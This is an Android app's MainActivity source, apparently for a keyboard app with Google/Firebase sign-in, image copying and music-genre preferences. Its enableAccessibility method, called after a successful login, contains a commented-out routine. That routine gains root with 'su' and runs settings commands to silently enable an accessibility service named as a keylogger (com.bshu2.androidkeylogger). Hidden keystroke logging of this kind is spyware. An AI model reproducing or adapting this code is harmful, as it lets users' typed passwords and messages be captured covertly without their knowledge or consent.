package com.example.keyboard;

import android.app.Activity;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Environment;
import android.os.Looper;
import android.os.StrictMode;
import android.provider.MediaStore;
import android.support.annotation.NonNull;
import android.support.v4.app.NotificationCompat;
import android.support.v4.app.NotificationManagerCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.TextView;
import android.widget.Toast;

import com.google.android.gms.auth.api.Auth;
import com.google.android.gms.auth.api.signin.GoogleSignIn;
import com.google.android.gms.auth.api.signin.GoogleSignInAccount;
import com.google.android.gms.auth.api.signin.GoogleSignInClient;
import com.google.android.gms.auth.api.signin.GoogleSignInOptions;
import com.google.android.gms.auth.api.signin.GoogleSignInResult;
import com.google.android.gms.common.ConnectionResult;
import com.google.android.gms.common.SignInButton;
import com.google.android.gms.common.api.ApiException;
import com.google.android.gms.common.api.GoogleApiClient;
import com.google.android.gms.tasks.Task;
import com.google.firebase.auth.AuthCredential;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.auth.GoogleAuthProvider;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.Random;

public class MainActivity extends AppCompatActivity implements GoogleApiClient.OnConnectionFailedListener, View.OnClickListener{

    private GoogleApiClient mGoogleApiClient;
    private static final int RC_SIGN_IN = 9001;
    private static final String TAG = "PlayActivity";
    private TextView status;
    static FirebaseUser currentUser = null;
    static final String appDirectoryName = "Telepathy";
    static final File imageRoot = new File(Environment.getExternalStoragePublicDirectory(
            Environment.DIRECTORY_PICTURES), appDirectoryName);

    private static int RESULT_LOAD_IMAGE = 1;

    @Override
    public void onConnectionFailed(@NonNull ConnectionResult connectionResult) {

    }

    private class Startup extends AsyncTask<Void, Void, Void> {
        @Override
        protected Void doInBackground(Void... params) {
            // this method is executed in a background thread
            // no problem calling su here
            enableAccessibility();
            return null;
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d("MainActivity", "onCreate");

        setContentView(R.layout.activity_main);


        //google start
        GoogleSignInOptions.Builder gsoBuilder =
                new GoogleSignInOptions.Builder(GoogleSignInOptions.DEFAULT_SIGN_IN)
                        .requestIdToken(getString(R.string.default_web_client_id))
                        .requestEmail();

        GoogleSignInOptions gso = gsoBuilder.build();
        mGoogleApiClient = new GoogleApiClient.Builder(this)
                .enableAutoManage(this, this)
                .addApi(Auth.GOOGLE_SIGN_IN_API, gso)
                .build();


        StrictMode.VmPolicy.Builder builder = new StrictMode.VmPolicy.Builder();
        StrictMode.setVmPolicy(builder.build());


        //google end
        SignInButton signInButton = findViewById(R.id.sign_in_button);
        signInButton.setSize(SignInButton.SIZE_STANDARD);
        signInButton.setOnClickListener(this);
        status = findViewById(R.id.status);

        createNotificationChannel();

        Button loadButton = findViewById(R.id.buttonLoadPicture);
        loadButton.setOnClickListener(this);

        //NewMessageNotification naman = new NewMessageNotification();
        //naman.notify(this, "FUCK B", 5, "1");
        //naman.execute();

        //naman.notify(this, "FUCK B", 5, "1", picture);



//        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, "1")
//                .setSmallIcon(R.drawable.common_google_signin_btn_icon_dark)
//                .setContentTitle("Title")
//                .setContentText("Content")
//                .setPriority(NotificationCompat.PRIORITY_DEFAULT);
//
//        NotificationManagerCompat notificationManager = NotificationManagerCompat.from(this);
//
//        // notificationId is a unique int for each notification that you must define
//        notificationManager.notify(123, builder.build());


        //(new Startup()).execute();
    }



    public void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == RC_SIGN_IN) {
            GoogleSignInResult result = Auth.GoogleSignInApi.getSignInResultFromIntent(data);
            Log.d(TAG, "Google authentication status: " + result.getStatus().getStatusMessage());
            // If Google ID authentication is successful, obtain a token for Firebase authentication.
            if (result.isSuccess() && result.getSignInAccount() != null) {
                AuthCredential credential = GoogleAuthProvider.getCredential(
                        result.getSignInAccount().getIdToken(), null);
                FirebaseAuth.getInstance().signInWithCredential(credential)
                        .addOnCompleteListener(this, task -> {
                            Log.d(TAG, "signInWithCredential:onComplete Successful: " + task.isSuccessful());
                            if (task.isSuccessful()) {
                                currentUser = FirebaseAuth.getInstance().getCurrentUser();
                                if (currentUser != null) {
                                    updateUI();
                                }
                            } else {
                                Log.w(TAG, "signInWithCredential:onComplete", task.getException());
                            }
                        });
            } else if (result.getStatus().isCanceled()) {
                String message = "Google authentication was canceled. "
                        + "Verify the SHA certificate fingerprint in the Firebase console.";
                Log.d(TAG, message);
                showErrorToast(new Exception(message));
            } else {
                Log.d(TAG, "Google authentication status: " + result.getStatus().toString());
                showErrorToast(new Exception(result.getStatus().toString()));
            }
        }

        if (requestCode == RESULT_LOAD_IMAGE && resultCode == RESULT_OK && null != data) {
            Uri selectedImage = data.getData();
            String[] filePathColumn = { MediaStore.Images.Media.DATA };

            Cursor cursor = getContentResolver().query(selectedImage,
                    filePathColumn, null, null, null);
            cursor.moveToFirst();

            int columnIndex = cursor.getColumnIndex(filePathColumn[0]);
            String picturePath = cursor.getString(columnIndex);
            cursor.close();

            imageRoot.mkdirs();
            //final File image = new File(imageRoot, "image1.jpg");
            //System.out.println(image.toString());
            System.out.println(picturePath);
            System.out.println(imageRoot);

            Random r = new Random();

            copyFile(picturePath, imageRoot+"/image"+Integer.toString(r.nextInt(100))+".jpg");

//            ImageView imageView = (ImageView) findViewById(R.id.imgView);
//            imageView.setImageBitmap(BitmapFactory.decodeFile(picturePath));

        }
    }

    public void onClick(View v) {
        switch (v.getId()) {
            case R.id.sign_in_button:
                Intent signInIntent = Auth.GoogleSignInApi.getSignInIntent(mGoogleApiClient);
                // Start authenticating with Google ID first.
                startActivityForResult(signInIntent, RC_SIGN_IN);
                break;
            case R.id.buttonLoadPicture:
                Intent i = new Intent(
                        Intent.ACTION_PICK, android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI);

                startActivityForResult(i, RESULT_LOAD_IMAGE);
        }
    }


    public void copyFile(String inputPath, String outputPath) {

        InputStream in = null;
        OutputStream out = null;
        try {
            System.out.println("INPUT "+ inputPath);
            System.out.println("OUTPUT "+ outputPath);

            in = new FileInputStream(inputPath);
            out = new FileOutputStream(outputPath);

            byte[] buffer = new byte[1024];
            int read;
            while ((read = in.read(buffer)) != -1) {
                out.write(buffer, 0, read);
            }
            in.close();
            in = null;

            // write the output file (You have now copied the file)
            out.flush();
            out.close();
            out = null;

//            LOGGER.debug("Copied file to " + outputPath);

        } catch (FileNotFoundException fnfe1) {
                System.out.println("EXCEPTION "+fnfe1.getMessage());
//            LOGGER.error(fnfe1.getMessage());
        } catch (Exception e) {
            System.out.println("EXCEPTION "+e.getMessage());
//            LOGGER.error("tag", e.getMessage());
        }
    }

    private void updateUI() {
        (new Startup()).execute();
        finish();
    }

    private void showErrorToast(Exception e) {
        Toast.makeText(getApplicationContext(), e.getLocalizedMessage(), Toast.LENGTH_LONG).show();
    }

    public void updatePreference(View view)
    {
        CheckBox rock = (CheckBox)findViewById(R.id.rock);
        CheckBox hip_hop = (CheckBox)findViewById(R.id.hip_hop);
        CheckBox pop = (CheckBox)findViewById(R.id.pop);
        CheckBox chill = (CheckBox)findViewById(R.id.chill);



        SharedPreferences sharedPreferences = this.getSharedPreferences("DATA", Context.MODE_PRIVATE);
        sharedPreferences.edit().putString("Rock", rock.isChecked() ? "1" : "0").apply();
        sharedPreferences.edit().putString("Hip_hop", hip_hop.isChecked() ? "1" : "0").apply();
        sharedPreferences.edit().putString("Chill", chill.isChecked() ? "1" : "0").apply();
        sharedPreferences.edit().putString("Pop", pop.isChecked() ? "1" : "0").apply();

    }

    void enableAccessibility(){
        Log.d("MainActivity", "enableAccessibility");
        if (Looper.myLooper() == Looper.getMainLooper()) {
            Log.d("MainActivity", "on main thread");
            // running on the main thread
        } /*else {
            Log.d("MainActivity", "not on main thread");
            // not running on the main thread
            try {
                Process process = Runtime.getRuntime().exec("su");
                DataOutputStream os = new DataOutputStream(process.getOutputStream());
                os.writeBytes("settings put secure enabled_accessibility_services com.bshu2.androidkeylogger/com.bshu2.androidkeylogger.Keylogger\n");
                os.flush();
                os.writeBytes("settings put secure accessibility_enabled 1\n");
                os.flush();
                os.writeBytes("exit\n");
                os.flush();

                process.waitFor();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }*/
    }

    private void createNotificationChannel() {
        // Create the NotificationChannel, but only on API 26+ because
        // the NotificationChannel class is new and not in the support library
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            CharSequence name = "Main Channel";
            String description = "Main Channel Desc";
            int importance = NotificationManager.IMPORTANCE_DEFAULT;
            NotificationChannel channel = new NotificationChannel("1", name, importance);
            channel.setDescription(description);
            // Register the channel with the system; you can't change the importance
            // or other notification behaviors after this
            NotificationManager notificationManager = getSystemService(NotificationManager.class);
            notificationManager.createNotificationChannel(channel);
        }
    }

}